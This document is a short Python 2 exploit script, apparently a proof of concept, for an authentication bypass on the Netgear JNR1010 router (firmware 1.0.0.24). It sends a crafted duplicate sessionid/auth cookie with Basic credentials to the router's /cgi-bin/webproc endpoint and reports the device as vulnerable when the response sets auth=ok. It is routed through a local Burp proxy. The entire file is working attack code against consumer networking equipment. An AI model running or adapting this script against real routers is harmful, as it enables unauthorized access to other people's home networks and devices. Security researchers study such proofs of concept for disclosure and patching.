#Device: Netgear JNR1010 Firmware: 1.0.0.24
import requests
import sys
import base64
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""

def exploit(target, ID, password, sessionID):

	#Authorization encode to Base64
	base = ID + ':' + password
	encookie = base64.encodestring(base)

	#to use burpsuite
	proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}

	with requests.Session() as s:
		URL = 'http://'+target+'/cgi-bin/webproc'
		headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
		cookies = {'Cookie' : 'sessionid=' + sessionID + '; auth=nok; expires=Sun, 15-May-2112 01:45:46 GMT; sessionid=' + sessionID + '; auth=ok; expires=Mon, 31-Jan-2112 16:00:00 GMT'}
		res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
		auth = s.cookies.get_dict().get('auth')

	if auth == 'ok':
		print s.cookies.get_dict()
		print (Fore.GREEN+" [+] This device has this vulnerability\n"+Fore.RESET)
	else:
		print (Fore.YELLOW+" [-] This device does not have this vulnerability"+Fore.RESET)

if __name__ == "__main__":
	print description
	if len(sys.argv) is not 5:
		print(Fore.YELLOW+"[-] Example: python Netgear_Authentication_Bypass.py <Target IP> <ID> <Password> <SessionID>"+Fore.RESET)
		sys.exit()
	else:
		exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

